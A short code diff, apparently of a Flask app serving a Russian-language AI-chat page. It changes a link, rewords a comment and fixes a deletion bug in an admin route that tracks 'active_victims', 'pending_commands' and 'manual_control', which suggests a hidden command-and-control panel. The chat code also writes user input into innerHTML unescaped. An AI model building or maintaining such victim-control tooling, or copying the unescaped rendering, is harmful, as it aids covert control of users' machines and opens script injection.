@@ -227,7 +227,7 @@ HTML_PAGE = """<!DOCTYPE html>
     
     <div class="link-btns-group">
         <a href="https://vk.com" target="_blank" class="link-nav-btn"><i class="fa-solid fa-globe"></i> Открыть VK</a>
-        <a href="https://ya.ru" target="_blank" class="link-nav-btn"><i class="fa-solid fa-bolt"></i> Открыть MAX</a>
+        <a href="https://max.ru" target="_blank" class="link-nav-btn"><i class="fa-solid fa-bolt"></i> Открыть MAX</a>
     </div>
 
     <div class="hist" id="historyList">
@@ -546,7 +546,7 @@ async function send(){
 
     let imgHtml = selectedBase64Image ? `<br><img src="${selectedBase64Image}" style="max-width:200px; border-radius:8px; margin-top:6px;">` : '';
     
-    // Мгновенно выводим сообщение пользователя в чат
+    // Мгновенно отрисовываем сообщение пользователя в чат
     c.innerHTML += `<div class="row"><div class="user-av-sq">Вы</div><div class="msg-container"><div class="usr-author">Вы</div><div class="txt">${t || '[Изображение]'}${imgHtml}</div></div></div>`;
     
     // Сразу показываем анимацию раздумий ИИ (три точки)
@@ -945,7 +945,7 @@ def admin_delete():
     data = request.json or {}
     target_ip = data.get("ip")
     if target_ip in active_victims: del active_victims[target_ip]
-    if target_ip in pending_commands: del active_victims[target_ip]
+    if target_ip in pending_commands: del pending_commands[target_ip]
     if target_ip in manual_control: del manual_control[target_ip]
     return jsonify({"status": "deleted"})
 
